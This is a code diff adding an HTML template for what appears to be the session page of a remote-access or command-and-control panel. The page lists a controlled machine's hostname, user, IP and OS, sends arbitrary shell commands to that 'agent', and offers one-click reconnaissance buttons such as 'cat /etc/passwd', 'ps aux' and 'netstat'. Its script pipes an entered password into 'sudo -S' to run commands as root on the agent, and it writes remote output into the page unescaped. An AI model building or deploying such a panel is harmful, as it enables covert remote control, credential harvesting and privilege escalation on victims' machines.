@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session - {{ session.id }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+        .header {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-bottom: 2px solid #e94560;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 { color: #e94560; }
+        .btn {
+            padding: 10px 20px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .btn:hover { background: #d63850; }
+        .btn-secondary { background: #444; }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        .info-card {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 3px solid #e94560;
+        }
+        .info-card label { color: #888; font-size: 0.9em; }
+        .info-card p { font-size: 1.1em; margin-top: 5px; }
+        .terminal {
+            background: #0d1117;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .terminal-header {
+            background: #161b22;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27ca40; }
+        .terminal-title { margin-left: 10px; color: #888; }
+        .terminal-body {
+            padding: 15px;
+            min-height: 300px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .output-line {
+            margin: 5px 0;
+            padding: 8px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 4px;
+        }
+        .output-line .time { color: #888; font-size: 0.8em; }
+        .output-line .command { color: #4ade80; }
+        .output-line .result { color: #fff; white-space: pre-wrap; }
+        .command-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .command-input input {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 1em;
+            font-family: 'Courier New', monospace;
+        }
+        .command-input input:focus {
+            outline: 2px solid #e94560;
+        }
+        .command-input button {
+            padding: 15px 30px;
+            font-size: 1em;
+        }
+        .quick-commands {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+        .quick-btn {
+            padding: 8px 15px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+        .quick-btn:hover { background: rgba(255,255,255,0.2); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🖥️ {{ session.info.hostname or session.id }}</h1>
+        <a href="/" class="btn btn-secondary">← Back to Dashboard</a>
+    </div>
+    
+    <div class="container">
+        <div class="info-grid">
+            <div class="info-card">
+                <label>Agent ID</label>
+                <p>{{ session.id }}</p>
+            </div>
+            <div class="info-card">
+                <label>Username</label>
+                <p>{{ session.info.user or 'Unknown' }}</p>
+            </div>
+            <div class="info-card">
+                <label>IP Address</label>
+                <p>{{ session.info.ip or 'Unknown' }}</p>
+            </div>
+            <div class="info-card">
+                <label>Operating System</label>
+                <p>{{ session.info.os or 'Unknown' }}</p>
+            </div>
+        </div>
+        
+        <div class="terminal">
+            <div class="terminal-header">
+                <span class="terminal-dot dot-red"></span>
+                <span class="terminal-dot dot-yellow"></span>
+                <span class="terminal-dot dot-green"></span>
+                <span class="terminal-title">Terminal - {{ session.id }}</span>
+            </div>
+            <div class="terminal-body" id="output">
+                {% if results %}
+                    {% for r in results %}
+                    <div class="output-line">
+                        <div class="time">{{ r.time }}</div>
+                        <div class="result">{{ r.result }}</div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div style="color: #888;">Waiting for commands...</div>
+                {% endif %}
+            </div>
+        </div>
+        
+        <div class="command-input">
+            <input type="text" id="command" placeholder="Enter command (e.g., whoami, ls, cat /etc/passwd)" autofocus>
+            <button class="btn" onclick="sendCommand()">Execute ▶</button>
+        </div>
+        
+        <div class="quick-commands">
+            <button class="quick-btn" onclick="quickCmd('whoami')">whoami</button>
+            <button class="quick-btn" onclick="quickCmd('id')">id</button>
+            <button class="quick-btn" onclick="quickCmd('pwd')">pwd</button>
+            <button class="quick-btn" onclick="quickCmd('ls -la')">ls -la</button>
+            <button class="quick-btn" onclick="quickCmd('cat /etc/passwd')">cat /etc/passwd</button>
+            <button class="quick-btn" onclick="quickCmd('uname -a')">uname -a</button>
+            <button class="quick-btn" onclick="quickCmd('ps aux')">ps aux</button>
+            <button class="quick-btn" onclick="quickCmd('netstat -tulpn')">netstat</button>
+            <button class="quick-btn" onclick="quickCmd('ifconfig || ip a')">ifconfig</button>
+        </div>
+    </div>
+    
+    <script>
+        const agentId = "{{ session.id }}";
+        
+        function sendCommand() {
+            let cmd = document.getElementById('command').value;
+            if (!cmd) return;
+            // Sudo password injection
+            if (window.lastSudoPrompt) {
+                cmd = `echo "${window.lastSudoPassword}" | sudo -S ${window.lastSudoCmd}`;
+                window.lastSudoPrompt = false;
+                window.lastSudoPassword = '';
+                window.lastSudoCmd = '';
+            }
+            fetch('/api/task', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({agent_id: agentId, command: cmd})
+            })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('command').value = '';
+                addOutput('Command sent: ' + cmd, '#4ade80');
+            });
+        }
+        
+        function quickCmd(cmd) {
+            document.getElementById('command').value = cmd;
+            sendCommand();
+        }
+        
+        function addOutput(text, color) {
+            const output = document.getElementById('output');
+            const div = document.createElement('div');
+            div.className = 'output-line';
+            div.innerHTML = `<div style="color: ${color}">${text}</div>`;
+            output.appendChild(div);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function loadResults() {
+            fetch('/api/results/' + agentId)
+            .then(r => r.json())
+            .then(data => {
+                const output = document.getElementById('output');
+                let cleared = false;
+                output.innerHTML = '';
+                data.forEach(r => {
+                    if (r.result && r.result.trim() === '[CLEAR_SCREEN]') {
+                        output.innerHTML = '';
+                        cleared = true;
+                        return;
+                    }
+                    if (r.result && r.result.trim() === '[SUDO_PROMPT]') {
+                        // Prompt for password
+                        window.lastSudoPrompt = true;
+                        window.lastSudoCmd = document.getElementById('command').value;
+                        const pw = prompt('Sudo parolni kiriting:');
+                        if (pw !== null) {
+                            window.lastSudoPassword = pw;
+                            document.getElementById('command').value = '';
+                            sendCommand();
+                        }
+                        return;
+                    }
+                    const div = document.createElement('div');
+                    div.className = 'output-line';
+                    div.innerHTML = `
+                        <div class="time">${r.time}</div>
+                        <div class="result">${r.result}</div>
+                    `;
+                    output.appendChild(div);
+                });
+                output.scrollTop = output.scrollHeight;
+            });
+        }
+        
+        // Enter key to send
+        document.getElementById('command').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendCommand();
+        });
+        
+        // Auto refresh results
+        setInterval(loadResults, 3000);
+    </script>
+</body>
+</html>
